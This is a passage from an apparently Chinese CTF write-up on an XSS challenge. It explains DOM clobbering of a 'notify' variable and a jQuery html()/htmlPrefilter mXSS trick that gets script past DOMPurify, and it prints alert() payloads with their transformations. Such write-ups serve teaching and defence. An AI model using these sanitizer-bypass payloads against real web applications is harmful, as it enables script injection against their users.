class="hljs-keyword">class</span>=&quot;<span class="hljs-title">circle</span>&quot; <span class="hljs-title">src</span>=&quot;$</span>{escape(</span></span><br><span class="line">        img</span><br><span class="line"><span class="hljs-actionscript">      )}<span class="hljs-string">&quot; onload=&quot;</span>memeGen(<span class="hljs-keyword">this</span>, notify)<span class="hljs-string">&quot;&gt;` +</span></span></span><br><span class="line"><span class="hljs-javascript">      <span class="hljs-string">`Creating meme... (<span class="hljs-subst">${DOMPurify.sanitize(text)}</span>)&lt;/div&gt;`</span></span></span><br><span class="line">    );</span><br><span class="line"><span class="hljs-actionscript">  } <span class="hljs-keyword">else</span> {</span></span><br><span class="line"><span class="hljs-javascript">    $(<span class="hljs-string">&quot;#meme-code&quot;</span>).text(</span></span><br><span class="line">      memeTemplate(</span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-string">&quot;https://i.imgur.com/PdbDexI.jpg&quot;</span>,</span></span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-string">&quot;When you get that WW3 draft letter&quot;</span></span></span><br><span class="line">      )</span><br><span class="line">    );</span><br><span class="line">  }</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x518D;&#x7B80;&#x5316;&#x4E00;&#x4E0B;&#x5C31;&#x6210;&#x4E86;&#x6211;&#x4EEC;&#x7684; C &#x8BED;&#x8A00;&#x51FD;&#x6570;&#x4F20;&#x53C2;&#x7684;&#x7EC3;&#x4E60;&#x9898;&#x4E86;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">const</span> memeGen = <span class="hljs-function">(<span class="hljs-params">that, x</span>) =&gt;</span> {</span><br><span class="line">  <span class="hljs-keyword">if</span> (x) {</span><br><span class="line">    <span class="hljs-comment">//...</span></span><br><span class="line">  }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4E3A;&#x4E86;&#x6613;&#x4E8E;&#x7406;&#x89E3;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5199;&#x6210;&#x8FD9;&#x6837;&#x5C31;&#x4E0D;&#x6613;&#x5F04;&#x6DF7;&#x4E86;&#xFF0C;&#x6240;&#x4EE5;&#xFF0C;&#x5BF9;&#x4E8E;<code>memeGen</code>&#x6765;&#x8BF4;&#xFF0C;<code>notify</code>&#x53EA;&#x662F;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x53D8;&#x91CF;&#x540D;&#xFF0C;&#x533A;&#x522B;&#x4E8E;&#x6211;&#x4EEC;&#x4E00;&#x5F00;&#x59CB;&#x63D0;&#x5230;&#x7684; Javascript Scope &#x90E8;&#x5206;&#xFF0C;&#x8BE5;&#x51FD;&#x6570;&#x5185;&#x7684;<code>notify</code>&#x53C2;&#x6570;&#x53D8;&#x91CF;&#x53D6;&#x51B3;&#x4E8E;&#x8BE5;&#x51FD;&#x6570;&#x6240;&#x5728;&#x7684;&#x4F5C;&#x7528;&#x57DF;&#x3002;</p><p>&#x800C;&#x5BF9;&#x4E8E;<code>memeGen</code>&#x51FD;&#x6570;&#x6765;&#x8BF4;&#xFF0C;&#x5B83;&#x7684;&#x4F5C;&#x7528;&#x57DF;&#x5E76;&#x975E;&#x662F;&#x5728;<code>let notify = false</code>&#x6240;&#x5904;&#x7684; JS &#x4EE3;&#x7801;&#x57DF;&#x5F53;&#x4E2D;&#xFF0C;&#x800C;&#x662F;&#x5728;&#x901A;&#x8FC7;<code>document.write</code>&#x51FD;&#x6570;&#x4E4B;&#x540E;&#x7684;&#x4F5C;&#x7528;&#x57DF;&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x91CC;&#x5C31;&#x6D89;&#x53CA;&#x5230;&#x4E86;&#x4F5C;&#x7528;&#x57DF;&#x7684;&#x95EE;&#x9898;&#x3002;</p><h3 id="JavaScript-Scope"><a href="#JavaScript-Scope" class="headerlink" title="JavaScript Scope"></a>JavaScript Scope</h3><p>&#x6240;&#x4EE5;&#x5BF9;&#x4E8E;&#x6267;&#x884C;<code>document.write</code>&#x51FD;&#x6570;&#x8FC7;&#x540E;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x5BF9;&#x4E8E;<code>onload=memeGen</code>&#x51FD;&#x6570;&#x6765;&#x8BF4;&#xFF0C;&#x5176;&#x4F5C;&#x7528;&#x57DF;&#x5E76;&#x975E;&#x662F; JS &#x7684;&#x4F5C;&#x7528;&#x57DF;&#xFF0C;&#x5728;&#x9898;&#x76EE;&#x4E2D;&#x672C;&#x6765;&#x8FD9;&#x4E48;&#x51E0;&#x4E2A;&#x4F5C;&#x7528;&#x57DF;&#xFF1A;window&#x3001;script&#x3001;onload&#xFF0C;&#x5176;&#x4E2D; window &#x5305;&#x542B;&#x4E86;&#x540E;&#x4E24;&#x4E2A;&#xFF0C;&#x540E;&#x4E24;&#x4E2A;&#x4E92;&#x4E0D;&#x5305;&#x542B;&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x91CC;&#x5728; onload &#x627E;&#x4E0D;&#x5230; notify &#x53D8;&#x91CF;&#xFF0C;&#x5C31;&#x4F1A;&#x53BB; window &#x7684;&#x4F5C;&#x7528;&#x57DF;&#x627E;&#xFF0C;&#x5C31;&#x4F1A;&#x628A; script &#x4F5C;&#x7528;&#x57DF;&#x5F53;&#x4E2D;&#x7684; notify &#x7ED9;&#x627E;&#x5230;&#xFF0C;notify &#x53D8;&#x91CF;&#x4E5F;&#x5C31;&#x6210; false &#x4E86;&#x3002;</p><p>&#x6211;&#x4EEC;&#x4E5F;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x4F8B;&#x5B50;&#x6765;&#x7406;&#x89E3;&#xFF1A;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">name</span>=<span class="hljs-string">x</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-keyword">const</span> test = <span class="hljs-function">(<span class="hljs-params">that,x</span>) =&gt;</span> {</span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;Test&apos;x: &quot;</span> + x);</span></span><br><span class="line">    if(x){</span><br><span class="line"><span class="hljs-javascript">      <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;JS Magic&quot;</span>);</span></span><br><span class="line">    }</span><br><span class="line">  };</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-keyword">let</span> x = <span class="hljs-literal">false</span>;</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;JS&apos;x: &quot;</span> + x);</span></span><br><span class="line"><span class="hljs-handlebars"><span class="hljs-xml">  document.write(&quot;<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">test(this,x)</span>&gt;</span>&quot;);</span></span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200202004222.png" alt></p><p>&#x539F;&#x7406;&#x90FD;&#x662F;&#x4E00;&#x6837;&#x7684;&#xFF0C;&#x8FD9;&#x91CC;<code>test</code>&#x51FD;&#x6570;&#x5728;<code>onerror</code>&#x4F5C;&#x7528;&#x57DF;&#x627E;&#x5230;&#x4E86; x &#x53D8;&#x91CF;&#xFF0C;&#x6240;&#x4EE5;&#x5C31;&#x4E0D;&#x4F1A;&#x518D;&#x53BB;&#x627E; window &#x4F5C;&#x7528;&#x57DF;&#x4E0B;&#x7684; <code>x=false</code>&#x53D8;&#x91CF;&#x4E86;&#xFF0C;&#x6240;&#x4EE5;&#x672C;&#x9898;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x5F15;&#x5165;&#x4E00;&#x4E2A;<code>name=notify</code>&#x7684;&#x6807;&#x7B7E;&#x6765;&#x201C;&#x8986;&#x76D6;&#x201D;&#x6389;&#x539F;&#x6765;&#x7684; notify &#x53D8;&#x91CF;&#x3002;</p><p>&#x5176;&#x5B9E;&#x8FD9;&#x4E5F;&#x662F;&#x4E00;&#x5F00;&#x59CB;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#x9898;&#x76EE;&#x7ED9;&#x51FA;&#x7684;&#x4EE3;&#x7801;&#x6709;&#x4E00;&#x5904;&#x4E5F;&#x6BD4;&#x8F83;&#x795E;&#x5947;&#x5C31;&#x662F; text &amp; img</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">const</span> memeGen = <span class="hljs-function">(<span class="hljs-params">that, notify</span>) =&gt;</span> {</span><br><span class="line">  <span class="hljs-keyword">if</span> (text &amp;&amp; img) {</span><br><span class="line">    template = memeTemplate(img, text);</span><br><span class="line">    ...</span><br><span class="line">  }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p></p><p><code>memeGen</code>&#x51FD;&#x6570;&#x5728;&#x51FD;&#x6570;&#x5185;&#x627E;&#x4E0D;&#x5230;<code>text</code>&#xFF0C;onload &#x7684;&#x4F5C;&#x7528;&#x57DF;&#x4E5F;&#x627E;&#x4E0D;&#x5230;<code>text</code>&#xFF0C;&#x5C31;&#x4F1A;&#x53BB; script&#x4E0B;&#x9762;&#x627E;&#xFF0C;&#x800C;&#x591A;&#x4E2A; script &#x5C5E;&#x4E8E;&#x540C;&#x4E00;&#x4E2A;&#x4F5C;&#x7528;&#x57DF;&#xFF0C;&#x6240;&#x4EE5;&#x5BF9;&#x4E8E;&#x51FD;&#x6570;&#x5F53;&#x4E2D;&#x7684; text &#x4EE5;&#x53CA; img &#xFF0C;&#x5B83;&#x662F;&#x5728;&#x4E0B;&#x4E00;&#x5757; JS &#x4EE3;&#x7801;&#x6BB5;&#x5B9A;&#x4E49;&#x7684;&#x3002;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript"><span class="hljs-keyword">let</span> notify = <span class="hljs-literal">false</span>;</span></span><br><span class="line"><span class="hljs-javascript"><span class="hljs-keyword">let</span> text = <span class="hljs-keyword">new</span> URL(location).searchParams.get(<span class="hljs-string">&quot;text&quot;</span>);</span></span><br><span class="line"><span class="hljs-javascript"><span class="hljs-keyword">let</span> img = <span class="hljs-keyword">new</span> URL(location).searchParams.get(<span class="hljs-string">&quot;img&quot;</span>);</span></span><br><span class="line">  ...</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201222425.png" alt></p><h3 id="JQuery&#x2019;s-&#x2018;mXSS&#x2019;"><a href="#JQuery&#x2019;s-&#x2018;mXSS&#x2019;" class="headerlink" title="JQuery&#x2019;s &#x2018;mXSS&#x2019;"></a>JQuery&#x2019;s &#x2018;mXSS&#x2019;</h3><p>&#x6240;&#x4EE5;&#x57FA;&#x672C;&#x4E0A; notify &#x7684;&#x95EE;&#x9898;&#x6211;&#x4EEC;&#x89E3;&#x51B3;&#x4E86;&#xFF0C;&#x63A5;&#x4E0B;&#x6765;&#x5C31;&#x662F; DOM Purify &#x7684;&#x95EE;&#x9898;&#x4E86;&#x3002;</p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x77E5;&#x9053;&#x6700;&#x7EC8;&#x6211;&#x4EEC;&#x8981;&#x63D2;&#x5165;&#x7684;&#x4EE3;&#x7801;&#x662F;&#x901A;&#x8FC7;<code>$(&quot;#notify&quot;).html(html)</code>&#x6765;&#x63D2;&#x5165;&#x7684;&#xFF0C;&#x800C;&#x53C2;&#x6570; html &#x53C8;&#x6765;&#x81EA;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">html = <span class="hljs-string">`&lt;div class=&quot;alert alert-warning&quot; role=&quot;alert&quot;&gt;&lt;b&gt;Meme&lt;/b&gt; created from <span class="hljs-subst">${DOMPurify.sanitize(text)}</span>&lt;/div&gt;`</span>;</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x7B80;&#x5355;&#x8DDF;&#x4E00;&#x4E0B; JQuery &#x7684; <code>html()</code> &#x51FD;&#x6570;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#x6709;&#x4EE5;&#x4E0B;&#x5229;&#x7528;&#x94FE;&#xFF1A;</p><p><a href="https://github.com/jquery/jquery/blob/d0ce00cdfa680f1f0c38460bc51ea14079ae8b07/src/manipulation.js#L372" target="_blank" rel="noopener">html()</a>-&gt;<a href="https://github.com/jquery/jquery/blob/d0ce00cdfa680f1f0c38460bc51ea14079ae8b07/src/manipulation.js#L406" target="_blank" rel="noopener">append()</a>-&gt;<a href="https://github.com/jquery/jquery/blob/d0ce00cdfa680f1f0c38460bc51ea14079ae8b07/src/manipulation.js#L312" target="_blank" rel="noopener">doManip()</a>-&gt;<a href="https://github.com/jquery/jquery/blob/d0ce00cdfa680f1f0c38460bc51ea14079ae8b07/src/manipulation.js#L117" target="_blank" rel="noopener">buildFragment()</a>-&gt;<a href="https://github.com/jquery/jquery/blob/d0ce00cdfa680f1f0c38460bc51ea14079ae8b07/src/manipulation/buildFragment.js#L39" target="_blank" rel="noopener">htmlPrefilter()</a></p><p>&#x5728; <a href="https://github.com/jquery/jquery/blob/d0ce00cdfa680f1f0c38460bc51ea14079ae8b07/src/manipulation.js#L202" target="_blank" rel="noopener">htmlPrefilter()</a> &#x51FD;&#x6570;&#x4E2D;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x6709;&#x8FD9;&#x4E48;&#x4E00;&#x6BB5;&#x4EE3;&#x7801;&#xFF1A;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">// source of htmlPrefilter()</span></span><br><span class="line">jQuery.extend( {</span><br><span class="line">truehtmlPrefilter: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"> html </span>) </span>{</span><br><span class="line">truetrue<span class="hljs-keyword">return</span> html.replace( rxhtmlTag, <span class="hljs-string">&quot;&lt;$1&gt;&lt;/$2&gt;&quot;</span> );</span><br><span class="line">true},</span><br><span class="line">    ...</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD9;&#x6BB5;&#x4EE3;&#x7801;&#x5C31;&#x662F;&#x7528;&#x6765;&#x8F6C;&#x6362;&#x4E00;&#x4E9B;&#x81EA;&#x95ED;&#x5408;&#x6807;&#x7B7E;&#x7684;&#x6807;&#x7B7E;&#xFF0C;&#x4F8B;&#x5982;<code>&lt;blah/&gt;</code>&#x53D8;&#x6210;<code>&lt;blah&gt;&lt;/blah&gt;</code>&#xFF0C;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x8FD9;&#x4E2A;&#x7279;&#x6027;&#x6765;&#x5B9E;&#x73B0;&#x4E00;&#x4E9B;&#x7ED5;&#x8FC7;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="hljs-xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>/&gt;</span>Elon</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x7ECF;&#x8FC7;<code>innerHTML</code>&#x4F1A;&#x53D8;&#x6210;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span></span><br><span class="line"><span class="hljs-xml">   <span class="hljs-tag">&lt;<span class="hljs-name">style</span>/&gt;</span>Elon</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4F46;&#x662F;&#x7ECF;&#x8FC7; jquery <code>html()</code> &#x5C31;&#x4F1A;&#x53D8;&#x6210;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span></span><br><span class="line"><span class="hljs-xml">   <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span></span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span></span><br><span class="line">Elon</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#x901A;&#x8FC7;<code>html()</code>&#x53EF;&#x4EE5;&#x628A;&#x4E00;&#x4E9B;&#x81EA;&#x95ED;&#x5408;&#x7684;&#x62C6;&#x5206;&#xFF0C;&#x4EE5;&#x53CA;&#x628A;&#x5185;&#x5BB9;&#x8F6C;&#x6362;&#x51FA;&#x53BB;&#xFF0C;&#x6709;&#x70B9;&#x7C7B;&#x4F3C;&#x4E8E; mXSS &#xFF0C;&#x6700;&#x7EC8;&#x6211;&#x4EEC;&#x5F97;&#x5230;&#x7684;&#x662F;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="hljs-xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>Elon<span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x8FD9;&#x4E2A;&#x7279;&#x6027;&#x7ED5;&#x8FC7; XSS WAF&#xFF0C;&#x4F8B;&#x5982;&#x4EE5;&#x4E0B;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="hljs-xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>/&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="hljs-actionscript">alert()<span class="hljs-comment">//</span></span></span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x7ECF;&#x8FC7;<code>DOMPurify.sanitize</code>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5F97;&#x5230;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="hljs-xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>/&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="hljs-actionscript">alert(<span class="hljs-number">1337</span>)<span class="hljs-comment">//</span></span></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x7ECF;&#x8FC7; jquery <code>html()</code>&#x5230;&#x6700;&#x7EC8;&#x6E32;&#x67D3;&#x9875;&#x9762;&#x5C31;&#x53D8;&#x6210;&#x4E86;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span 